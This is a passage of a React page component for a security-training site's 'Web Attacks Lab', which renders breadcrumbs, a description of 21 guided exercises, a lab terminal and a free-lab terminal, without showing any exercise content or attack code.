        <Link href="/" style={{ color: '#004a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/web-attacks" style={{ color: '#004a5a', textDecoration: 'none' }}>WEB ATTACKS</Link>
        <span>›</span>
        <span style={{ color: accent }}>LAB</span>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2rem' }}>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', color: accent, marginBottom: '0.5rem' }}>
          Web Attacks Lab
        </h1>
        <p style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a9aaa', lineHeight: 1.6 }}>
          21 guided exercises across 6 attack phases. From fingerprinting to advanced injection techniques,
          request smuggling, OAuth attacks, and GraphQL exploitation.
          {' '}<span style={{ color: accent }}>{xpTotal} XP total.</span>
        </p>
      </div>

      <LabTerminal
        labId="web-attacks-lab"
        moduleId={moduleId}
        title="Web Attacks Lab"
        accent={accent}
        steps={steps}
        onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
      />

      {guidedDone && (
        <div style={{ marginTop: '3rem' }}>
          <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} />
        </div>
      )}

      <div style={{ marginTop: '3rem' }}>
        <Link href="/modules/web-attacks" style={{ color: '#2a6a7a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', textDecoration: 'none' }}>
          ← Back to Concept
        </Link>
      </div>
    </div>
  )
}
